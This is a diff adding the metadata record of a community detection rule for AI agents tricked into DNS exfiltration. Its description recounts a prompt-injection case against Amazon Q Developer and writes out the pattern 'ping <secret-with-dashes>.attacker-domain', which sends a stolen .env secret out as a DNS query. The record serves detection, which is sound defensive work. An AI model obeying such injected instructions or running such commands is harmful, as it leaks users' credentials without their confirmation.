@@ -1,0 +1,21 @@
+{
+  "uuid": "76f12a4e-f7ed-4834-aaba-b90673766cf9",
+  "title": "DNS Exfiltration via Ping/Dig/Nslookup Command with Data-Encoded Subdomain Label",
+  "format": "atr",
+  "author": "ATR Community (CVE sweep)",
+  "license": "Unknown",
+  "license_verified": false,
+  "description": "Detects an agent being directed to run a network-diagnostic command (ping, dig, or nslookup) whose target hostname carries an encoded secret as the leftmost subdomain label -- either a long dash-segmented alphanumeric blob (the classic \"replace = with -\" trick that turns a base64/API-key value into a DNS-safe label) or a recognizable cloud/API credential prefix embedded directly in the hostname. Mined from AWS Security Bulletin AWS-2025-019 (Amazon Q Developer and Kiro IDE plugins), which documents Embrace The Red's \"Amazon Q Developer: Secrets Leaked via DNS and Prompt Injection\" research -- Amazon Q classified ping/dig as \"read-only\" and let a prompt-injected instruction exfiltrate a stolen .env value by constructing `ping <secret-with-dashes>.attacker-domain` so the secret left the host as a DNS query, requiring no outbound HTTP call and no human confirmation. Generalizes beyond Amazon Q to any agent/IDE that treats ping/dig/nslookup as safe-by-default. Ordinary network troubleshooting (`ping google.com`, `dig +short example.com`, `ping my-server-01.internal.corp`) does not carry a long high-entropy or credential-shaped label and must not fire.\n",
+  "source": "https://github.com/Agent-Threat-Rule/agent-threat-rules",
+  "tags": [
+    "tlp:clear",
+    "PAP:CLEAR"
+  ],
+  "attack_techniques": [
+    "T1048.003"
+  ],
+  "cve": [],
+  "created_at": "2026-07-22",
+  "last_modified": "2026-07-22",
+  "rulezet_url": "https://rulezet.org/rule/detail_rule/241286"
+}
